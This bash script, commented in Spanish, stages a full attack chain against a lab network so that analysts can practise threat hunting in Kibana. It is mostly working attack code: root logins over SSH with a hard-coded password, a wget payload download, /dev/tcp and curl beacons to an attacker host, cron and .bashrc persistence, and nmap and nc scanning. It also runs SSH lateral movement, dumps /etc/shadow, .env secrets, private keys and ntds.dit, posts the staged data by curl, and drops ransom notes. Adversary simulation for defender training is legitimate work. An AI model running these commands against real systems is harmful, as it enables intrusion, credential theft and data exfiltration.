#!/bin/bash
###############################################################################
# FULL ATTACK CHAIN - Simulación APT Completa
# 
# ESCENARIO: Un empleado de Finanzas (maria.gonzalez) descarga un archivo
# malicioso desde un sitio web comprometido. El malware establece persistencia,
# realiza reconocimiento interno, se mueve lateralmente a otros endpoints,
# roba credenciales y exfiltra datos sensibles.
#
# FASES DEL ATAQUE (MITRE ATT&CK):
#   1. Initial Access (T1566.002) - Descarga drive-by
#   2. Execution (T1059) - Ejecución de payload
#   3. Persistence (T1053.003) - Crontab backdoor
#   4. Discovery (T1046, T1087) - Reconocimiento interno
#   5. Lateral Movement (T1021.004) - SSH a otros hosts
#   6. Credential Access (T1003) - Robo de credenciales
#   7. Collection (T1005) - Recolección de datos
#   8. Exfiltration (T1048) - Exfiltración de datos
#   9. Impact (T1486) - Simulación de ransomware (solo marcadores)
#
# TIEMPO TOTAL: ~5 minutos (con pausas para observación en ELK)
###############################################################################

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

ATTACKER_IP="10.10.10.200"
TARGET1="10.10.10.101"  # WS-FINANZAS-01 (Initial Access)
TARGET2="10.10.10.102"  # WS-RRHH-01
TARGET3="10.10.10.103"  # SRV-FILESERVER-01
TARGET4="10.10.10.104"  # WS-DESARROLLO-01
TARGET5="10.10.10.105"  # DC-CORP-01
SSH_PASS="Password123!"

banner() {
    echo -e "${RED}"
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║          🔴 APT ATTACK SIMULATION - FULL CHAIN 🔴           ║"
    echo "║                                                              ║"
    echo "║  Threat Actor: APT-LABSIM (Simulated)                      ║"
    echo "║  Campaign: Operation Shadow Finance                          ║"
    echo "║  Target: CORP Network (10.10.10.0/24)                       ║"
    echo "║                                                              ║"
    echo "║  ⚠️  SOLO PARA USO EDUCATIVO - THREAT HUNTING LAB  ⚠️       ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

phase_header() {
    echo ""
    echo -e "${PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${PURPLE}  FASE $1: $2${NC}"
    echo -e "${PURPLE}  MITRE ATT&CK: $3${NC}"
    echo -e "${PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
}

step() {
    echo -e "${CYAN}  [$(date +%H:%M:%S)] ${GREEN}▶ $1${NC}"
}

alert() {
    echo -e "${YELLOW}  [!] $1${NC}"
}

success() {
    echo -e "${GREEN}  [✓] $1${NC}"
}

pause_for_elk() {
    echo ""
    echo -e "${YELLOW}  ⏸️  Pausa de $1 segundos para observar en ELK/Kibana...${NC}"
    echo -e "${YELLOW}     Revisa el dashboard de Threat Hunting en http://localhost:5601${NC}"
    echo ""
    sleep $1
}

# Enviar evento directamente a Elasticsearch para dashboard en tiempo real
elk_event() {
    local event_type="$1"
    local technique="$2"
    local tactic="$3"
    local endpoint="$4"
    local endpoint_ip="$5"
    local risk_level="$6"
    local description="$7"
    local extra="$8"
    local NOW=$(date -u +%Y-%m-%dT%H:%M:%S.000Z)
    local TODAY=$(date +%Y.%m.%d)
    local ES_URL="http://elasticsearch:9200"
    
    local DOC='{"@timestamp":"'"${NOW}"'","event_type":"'"${event_type}"'","technique":"'"${technique}"'","tactic":"'"${tactic}"'","endpoint":"'"${endpoint}"'","endpoint_ip":"'"${endpoint_ip}"'","risk_level":"'"${risk_level}"'","description":"'"${description}"'"}'
    
    curl -s -X POST "${ES_URL}/threat-hunting-${TODAY}/_doc" \
        -H "Content-Type: application/json" \
        -d "${DOC}" > /dev/null 2>&1
}

###############################################################################
# INICIO DEL ATAQUE
###############################################################################
clear
banner
echo ""
echo -e "${YELLOW}El ataque comenzará en 5 segundos...${NC}"
echo -e "${YELLOW}Abre Kibana (http://localhost:5601) para monitorear en tiempo real${NC}"
sleep 5

###############################################################################
# FASE 1: INITIAL ACCESS - Descarga de payload malicioso
###############################################################################
phase_header "1" "INITIAL ACCESS - Drive-by Download" "T1566.002, T1204.002"

step "Simulando que maria.gonzalez descarga 'factura_pendiente.pdf.sh' desde sitio malicioso..."
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
    "wget -q http://10.10.10.66/malicious_update.sh -O /tmp/factura_pendiente.pdf.sh" 2>/dev/null
success "Archivo malicioso descargado en WS-FINANZAS-01:/tmp/factura_pendiente.pdf.sh"
elk_event "initial_access" "T1566.002" "Initial Access" "WS-FINANZAS-01" "10.10.10.101" "CRITICAL" "Usuario descarga archivo malicioso factura_pendiente.pdf.sh"

step "Registrando evento de descarga en logs..."
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
    "echo '{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)\",\"event\":\"file_download\",\"user\":\"maria.gonzalez\",\"source\":\"http://evil-downloads.corp/factura_pendiente.pdf.sh\",\"destination\":\"/tmp/factura_pendiente.pdf.sh\",\"threat\":\"T1566.002\"}' >> /var/log/attack_simulation.log" 2>/dev/null

pause_for_elk 10

###############################################################################
# FASE 2: EXECUTION - Ejecución del payload
###############################################################################
phase_header "2" "EXECUTION - Payload Execution" "T1059.004, T1204.002"

step "Haciendo ejecutable el payload..."
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
    "chmod +x /tmp/factura_pendiente.pdf.sh" 2>/dev/null

step "Ejecutando payload (reverse shell simulada + beacon)..."
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
    "nohup bash -c 'while true; do echo beacon > /dev/tcp/${ATTACKER_IP}/4444 2>/dev/null; sleep 30; done' &" 2>/dev/null
success "Beacon C2 establecido desde WS-FINANZAS-01 hacia ${ATTACKER_IP}:4444"
elk_event "execution" "T1059.004" "Execution" "WS-FINANZAS-01" "10.10.10.101" "CRITICAL" "Reverse shell establecida hacia C2 server 10.10.10.200:4444"

step "Creando proceso hijo sospechoso (encoded command)..."
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
    "echo 'aWQgJiYgd2hvYW1pICYmIHVuYW1lIC1h' | base64 -d | bash" 2>/dev/null

step "Registrando ejecución..."
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
    "echo '{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)\",\"event\":\"malware_execution\",\"process\":\"/tmp/factura_pendiente.pdf.sh\",\"parent\":\"bash\",\"user\":\"maria.gonzalez\",\"threat\":\"T1059.004\",\"c2_server\":\"${ATTACKER_IP}:4444\"}' >> /var/log/attack_simulation.log" 2>/dev/null

pause_for_elk 10

###############################################################################
# FASE 3: PERSISTENCE - Establecer persistencia
###############################################################################
phase_header "3" "PERSISTENCE - Crontab & Backdoor" "T1053.003, T1546.004"

step "Instalando crontab backdoor en WS-FINANZAS-01..."
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
    "(crontab -l 2>/dev/null; echo '*/5 * * * * /tmp/.hidden_beacon.sh') | crontab -" 2>/dev/null

step "Creando script de persistencia oculto..."
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
    "echo '#!/bin/bash
# Hidden beacon - persistence mechanism
curl -s http://${ATTACKER_IP}:8080/beacon?host=\$(hostname) > /dev/null 2>&1
' > /tmp/.hidden_beacon.sh && chmod +x /tmp/.hidden_beacon.sh" 2>/dev/null

step "Modificando .bashrc para persistencia adicional..."
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
    "echo '# System update check
curl -s http://${ATTACKER_IP}:8080/update > /dev/null 2>&1 &' >> /home/maria.gonzalez/.bashrc" 2>/dev/null
success "Persistencia establecida via crontab + .bashrc"
elk_event "persistence" "T1053.003" "Persistence" "WS-FINANZAS-01" "10.10.10.101" "HIGH" "Crontab backdoor instalado - beacon cada 5 minutos"
elk_event "persistence" "T1546.004" "Persistence" "WS-FINANZAS-01" "10.10.10.101" "HIGH" "Bashrc modificado para persistencia adicional"

step "Registrando persistencia..."
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
    "echo '{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)\",\"event\":\"persistence_installed\",\"mechanism\":\"crontab\",\"path\":\"/tmp/.hidden_beacon.sh\",\"user\":\"root\",\"threat\":\"T1053.003\"}' >> /var/log/attack_simulation.log" 2>/dev/null

pause_for_elk 8

###############################################################################
# FASE 4: DISCOVERY - Reconocimiento interno
###############################################################################
phase_header "4" "DISCOVERY - Internal Reconnaissance" "T1046, T1087, T1082"

step "Enumerando red interna desde WS-FINANZAS-01..."
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
    "nmap -sn 10.10.10.0/24 -oN /tmp/network_scan.txt 2>/dev/null" 2>/dev/null
success "Escaneo de red completado - hosts descubiertos"

step "Enumerando usuarios del sistema..."
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
    "cat /etc/passwd | grep -v nologin | grep -v false > /tmp/users_enum.txt" 2>/dev/null

step "Recolectando información del sistema..."
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
    "uname -a > /tmp/sysinfo.txt && id >> /tmp/sysinfo.txt && ip addr >> /tmp/sysinfo.txt" 2>/dev/null

step "Escaneando puertos SSH abiertos en la red..."
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
    "for ip in 101 102 103 104 105; do nc -zv 10.10.10.\$ip 22 2>&1 | grep succeeded; done > /tmp/ssh_targets.txt" 2>/dev/null
success "Targets SSH identificados para movimiento lateral"
elk_event "discovery" "T1046" "Discovery" "WS-FINANZAS-01" "10.10.10.101" "MEDIUM" "Network scan nmap -sn 10.10.10.0/24 - 5 hosts descubiertos"
elk_event "discovery" "T1087.001" "Discovery" "WS-FINANZAS-01" "10.10.10.101" "MEDIUM" "Enumeracion de usuarios y puertos SSH abiertos"

step "Registrando reconocimiento..."
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
    "echo '{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)\",\"event\":\"network_discovery\",\"tool\":\"nmap\",\"targets_found\":5,\"ssh_open\":[\"10.10.10.102\",\"10.10.10.103\",\"10.10.10.104\",\"10.10.10.105\"],\"threat\":\"T1046\"}' >> /var/log/attack_simulation.log" 2>/dev/null

pause_for_elk 10

###############################################################################
# FASE 5: LATERAL MOVEMENT - Movimiento a otros endpoints
###############################################################################
phase_header "5" "LATERAL MOVEMENT - SSH Propagation" "T1021.004, T1570"

# Movimiento a WS-RRHH-01
step "Movimiento lateral a WS-RRHH-01 (10.10.10.102)..."
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
    "sshpass -p '${SSH_PASS}' ssh -o StrictHostKeyChecking=no root@${TARGET2} 'echo COMPROMISED > /tmp/.lateral_marker && whoami && hostname'" 2>/dev/null
success "WS-RRHH-01 comprometido via SSH desde WS-FINANZAS-01"
elk_event "lateral_movement" "T1021.004" "Lateral Movement" "WS-RRHH-01" "10.10.10.102" "CRITICAL" "Movimiento lateral via SSH desde WS-FINANZAS-01"

# Instalar beacon en TARGET2
step "Instalando beacon en WS-RRHH-01..."
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET2} \
    "echo '#!/bin/bash
while true; do echo beacon_rrhh > /dev/tcp/${ATTACKER_IP}/4444 2>/dev/null; sleep 60; done' > /tmp/.beacon_rrhh.sh && chmod +x /tmp/.beacon_rrhh.sh && nohup /tmp/.beacon_rrhh.sh &" 2>/dev/null

# Registrar en TARGET2
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET2} \
    "echo '{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)\",\"event\":\"lateral_movement_received\",\"source\":\"10.10.10.101\",\"method\":\"ssh\",\"user\":\"root\",\"threat\":\"T1021.004\"}' >> /var/log/attack_simulation.log" 2>/dev/null

# Movimiento a SRV-FILESERVER-01
step "Movimiento lateral a SRV-FILESERVER-01 (10.10.10.103)..."
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
    "sshpass -p '${SSH_PASS}' ssh -o StrictHostKeyChecking=no root@${TARGET3} 'echo COMPROMISED > /tmp/.lateral_marker && whoami && hostname'" 2>/dev/null
success "SRV-FILESERVER-01 comprometido via SSH"
elk_event "lateral_movement" "T1021.004" "Lateral Movement" "SRV-FILESERVER-01" "10.10.10.103" "CRITICAL" "Movimiento lateral via SSH desde WS-FINANZAS-01"

sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET3} \
    "echo '{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)\",\"event\":\"lateral_movement_received\",\"source\":\"10.10.10.101\",\"method\":\"ssh\",\"user\":\"root\",\"threat\":\"T1021.004\"}' >> /var/log/attack_simulation.log" 2>/dev/null

# Movimiento a WS-DESARROLLO-01
step "Movimiento lateral a WS-DESARROLLO-01 (10.10.10.104)..."
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
    "sshpass -p '${SSH_PASS}' ssh -o StrictHostKeyChecking=no root@${TARGET4} 'echo COMPROMISED > /tmp/.lateral_marker && whoami && hostname'" 2>/dev/null
success "WS-DESARROLLO-01 comprometido via SSH"
elk_event "lateral_movement" "T1021.004" "Lateral Movement" "WS-DESARROLLO-01" "10.10.10.104" "CRITICAL" "Movimiento lateral via SSH desde WS-FINANZAS-01"

sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET4} \
    "echo '{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)\",\"event\":\"lateral_movement_received\",\"source\":\"10.10.10.101\",\"method\":\"ssh\",\"user\":\"root\",\"threat\":\"T1021.004\"}' >> /var/log/attack_simulation.log" 2>/dev/null

# Movimiento a DC-CORP-01 (objetivo final)
step "Movimiento lateral a DC-CORP-01 (10.10.10.105) - OBJETIVO FINAL..."
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
    "sshpass -p '${SSH_PASS}' ssh -o StrictHostKeyChecking=no root@${TARGET5} 'echo DOMAIN_COMPROMISED > /tmp/.lateral_marker && whoami && hostname'" 2>/dev/null
success "DC-CORP-01 (Domain Controller) COMPROMETIDO!"
elk_event "lateral_movement" "T1021.004" "Lateral Movement" "DC-CORP-01" "10.10.10.105" "CRITICAL" "Domain Controller comprometido via SSH chain"

sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET5} \
    "echo '{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)\",\"event\":\"domain_controller_compromised\",\"source\":\"10.10.10.101\",\"method\":\"ssh_chain\",\"user\":\"root\",\"threat\":\"T1021.004\",\"severity\":\"CRITICAL\"}' >> /var/log/attack_simulation.log" 2>/dev/null

pause_for_elk 15

###############################################################################
# FASE 6: CREDENTIAL ACCESS - Robo de credenciales
###############################################################################
phase_header "6" "CREDENTIAL ACCESS - Credential Harvesting" "T1003.008, T1552.001"

step "Extrayendo /etc/shadow de todos los endpoints..."
for target in ${TARGET1} ${TARGET2} ${TARGET3} ${TARGET4} ${TARGET5}; do
    sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${target} \
        "cat /etc/shadow > /tmp/.shadow_dump_$(hostname) 2>/dev/null" 2>/dev/null
done
success "Shadow files extraidos de 5 endpoints"
elk_event "credential_access" "T1003.008" "Credential Access" "WS-FINANZAS-01" "10.10.10.101" "CRITICAL" "Dump de /etc/shadow en todos los endpoints"
elk_event "credential_access" "T1003.008" "Credential Access" "DC-CORP-01" "10.10.10.105" "CRITICAL" "Dump de /etc/shadow en Domain Controller"

step "Buscando credenciales en archivos de configuración..."
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET4} \
    "find /home -name '*.env' -o -name 'config*' -o -name '*.conf' 2>/dev/null | head -20 > /tmp/.found_configs.txt && cat /home/pedro.silva/projects/.env > /tmp/.stolen_creds.txt" 2>/dev/null
success "Credenciales de desarrollo encontradas (AWS keys, DB passwords)"
elk_event "credential_access" "T1552.001" "Credential Access" "WS-DESARROLLO-01" "10.10.10.104" "CRITICAL" "API keys y DB passwords encontrados en archivos .env"

step "Extrayendo claves SSH para persistencia..."
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET4} \
    "cp /home/pedro.silva/.ssh/id_rsa /tmp/.stolen_ssh_key 2>/dev/null" 2>/dev/null

step "Simulando DCSync en Domain Controller..."
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET5} \
    "cat /var/lib/samba/private/ntds.dit > /tmp/.ntds_dump 2>/dev/null && echo '{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)\",\"event\":\"dcsync_simulation\",\"target\":\"ntds.dit\",\"threat\":\"T1003.003\",\"severity\":\"CRITICAL\"}' >> /var/log/attack_simulation.log" 2>/dev/null
success "NTDS.dit extraido del Domain Controller (simulado)"
elk_event "credential_access" "T1003.003" "Credential Access" "DC-CORP-01" "10.10.10.105" "CRITICAL" "DCSync - NTDS.dit extraido del Domain Controller"

pause_for_elk 10

###############################################################################
# FASE 7: COLLECTION - Recolección de datos sensibles
###############################################################################
phase_header "7" "COLLECTION - Data Staging" "T1005, T1074.001"

step "Recolectando datos sensibles del File Server..."
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET3} \
    "tar czf /tmp/.exfil_data.tar.gz /srv/shares/ 2>/dev/null" 2>/dev/null
success "Datos del File Server comprimidos para exfiltracion"
elk_event "collection" "T1005" "Collection" "SRV-FILESERVER-01" "10.10.10.103" "HIGH" "Datos sensibles del file server comprimidos para exfiltracion"

step "Recolectando documentos de Finanzas..."
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
    "tar czf /tmp/.exfil_finanzas.tar.gz /home/maria.gonzalez/Documents/ 2>/dev/null" 2>/dev/null

step "Recolectando datos de RRHH..."
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET2} \
    "tar czf /tmp/.exfil_rrhh.tar.gz /home/carlos.mendez/Documents/ 2>/dev/null" 2>/dev/null

step "Registrando recolección..."
for target in ${TARGET1} ${TARGET2} ${TARGET3}; do
    sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${target} \
        "echo '{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)\",\"event\":\"data_collection\",\"files_staged\":\"/tmp/.exfil_*.tar.gz\",\"threat\":\"T1074.001\"}' >> /var/log/attack_simulation.log" 2>/dev/null
done
success "Datos sensibles preparados para exfiltracion en 3 endpoints"
elk_event "collection" "T1074.001" "Collection" "WS-FINANZAS-01" "10.10.10.101" "HIGH" "Datos de Finanzas, RRHH y File Server staged para exfiltracion"

pause_for_elk 8

###############################################################################
# FASE 8: EXFILTRATION - Exfiltración de datos
###############################################################################
phase_header "8" "EXFILTRATION - Data Transfer" "T1048.003, T1041"

step "Exfiltrando datos via SCP al servidor del atacante..."
for target in ${TARGET1} ${TARGET2} ${TARGET3}; do
    sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${target} \
        "cat /tmp/.exfil_*.tar.gz | base64 > /tmp/.exfil_encoded.txt 2>/dev/null" 2>/dev/null
done
success "Datos codificados en base64 para transferencia"

step "Simulando transferencia a C2 server..."
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
    "curl -s -X POST http://${ATTACKER_IP}:8080/exfil -d @/tmp/.exfil_encoded.txt 2>/dev/null || echo 'Transfer simulated'" 2>/dev/null

step "Registrando exfiltración..."
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
    "echo '{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)\",\"event\":\"data_exfiltration\",\"method\":\"http_post\",\"destination\":\"${ATTACKER_IP}:8080\",\"data_size\":\"estimated_50MB\",\"threat\":\"T1048.003\",\"severity\":\"CRITICAL\"}' >> /var/log/attack_simulation.log" 2>/dev/null
success "Datos exfiltrados exitosamente (simulado)"
elk_event "exfiltration" "T1048.003" "Exfiltration" "WS-FINANZAS-01" "10.10.10.101" "CRITICAL" "Datos exfiltrados via HTTP POST a C2 server 10.10.10.200:8080"
elk_event "exfiltration" "T1048.003" "Exfiltration" "SRV-FILESERVER-01" "10.10.10.103" "CRITICAL" "Datos del file server exfiltrados al atacante"

pause_for_elk 10

###############################################################################
# FASE 9: IMPACT - Simulación de ransomware (solo marcadores)
###############################################################################
phase_header "9" "IMPACT - Ransomware Simulation (Markers Only)" "T1486"

alert "NOTA: Esta fase SOLO crea archivos marcadores, NO cifra datos reales"

step "Creando nota de rescate en todos los endpoints..."
RANSOM_NOTE='
╔══════════════════════════════════════════════════════════════╗
║                    YOUR FILES ARE ENCRYPTED                   ║
║                                                              ║
║  All your important files have been encrypted with           ║
║  military-grade AES-256 encryption.                          ║
║                                                              ║
║  To recover your files, send 5 BTC to:                      ║
║  bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh               ║
║                                                              ║
║  ⚠️  THIS IS A SIMULATION - THREAT HUNTING LAB  ⚠️           ║
║  No real encryption was performed.                           ║
╚══════════════════════════════════════════════════════════════╝
'

for target in ${TARGET1} ${TARGET2} ${TARGET3} ${TARGET4} ${TARGET5}; do
    sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${target} \
        "echo '${RANSOM_NOTE}' > /tmp/RANSOM_NOTE.txt && echo '{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)\",\"event\":\"ransomware_simulation\",\"note_path\":\"/tmp/RANSOM_NOTE.txt\",\"threat\":\"T1486\",\"severity\":\"CRITICAL\",\"note\":\"SIMULATION_ONLY\"}' >> /var/log/attack_simulation.log" 2>/dev/null
done
success "Notas de rescate desplegadas (SIMULACION - sin cifrado real)"
elk_event "impact" "T1486" "Impact" "WS-FINANZAS-01" "10.10.10.101" "CRITICAL" "Ransomware simulation - notas de rescate desplegadas en 5 endpoints"
elk_event "impact" "T1486" "Impact" "DC-CORP-01" "10.10.10.105" "CRITICAL" "Ransomware simulation - Domain Controller afectado"

pause_for_elk 5

###############################################################################
# RESUMEN FINAL
###############################################################################
echo ""
echo -e "${RED}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║              🔴 ATAQUE COMPLETADO - RESUMEN 🔴              ║${NC}"
echo -e "${RED}╠══════════════════════════════════════════════════════════════╣${NC}"
echo -e "${RED}║                                                              ║${NC}"
echo -e "${RED}║  Endpoints comprometidos: 5/5                               ║${NC}"
echo -e "${RED}║  Persistencia instalada: 2 mecanismos                       ║${NC}"
echo -e "${RED}║  Credenciales robadas: shadow files + API keys              ║${NC}"
echo -e "${RED}║  Datos exfiltrados: Finanzas + RRHH + File Server           ║${NC}"
echo -e "${RED}║  Domain Controller: COMPROMETIDO                            ║${NC}"
echo -e "${RED}║                                                              ║${NC}"
echo -e "${RED}║  MITRE ATT&CK Techniques Used:                             ║${NC}"
echo -e "${RED}║    T1566.002 - Spearphishing Link                           ║${NC}"
echo -e "${RED}║    T1059.004 - Unix Shell                                   ║${NC}"
echo -e "${RED}║    T1053.003 - Cron                                         ║${NC}"
echo -e "${RED}║    T1046     - Network Service Discovery                    ║${NC}"
echo -e "${RED}║    T1087     - Account Discovery                            ║${NC}"
echo -e "${RED}║    T1021.004 - SSH                                          ║${NC}"
echo -e "${RED}║    T1003     - OS Credential Dumping                        ║${NC}"
echo -e "${RED}║    T1005     - Data from Local System                       ║${NC}"
echo -e "${RED}║    T1048.003 - Exfiltration Over Unencrypted Protocol       ║${NC}"
echo -e "${RED}║    T1486     - Data Encrypted for Impact                    ║${NC}"
echo -e "${RED}║                                                              ║${NC}"
echo -e "${RED}╠══════════════════════════════════════════════════════════════╣${NC}"
echo -e "${RED}║                                                              ║${NC}"
echo -e "${RED}║  🔍 AHORA: Abre Kibana y realiza la cacería de amenazas    ║${NC}"
echo -e "${RED}║     http://localhost:5601                                    ║${NC}"
echo -e "${RED}║                                                              ║${NC}"
echo -e "${RED}║  Busca los IOCs en los dashboards de:                       ║${NC}"
echo -e "${RED}║    - Osquery Results                                        ║${NC}"
echo -e "${RED}║    - Process Events                                         ║${NC}"
echo -e "${RED}║    - Network Events                                         ║${NC}"
echo -e "${RED}║    - Attack Simulation                                      ║${NC}"
echo -e "${RED}║                                                              ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${GREEN}Ataque finalizado. Tiempo total: ~5 minutos${NC}"
echo -e "${GREEN}Todos los eventos fueron registrados en ELK para análisis.${NC}"
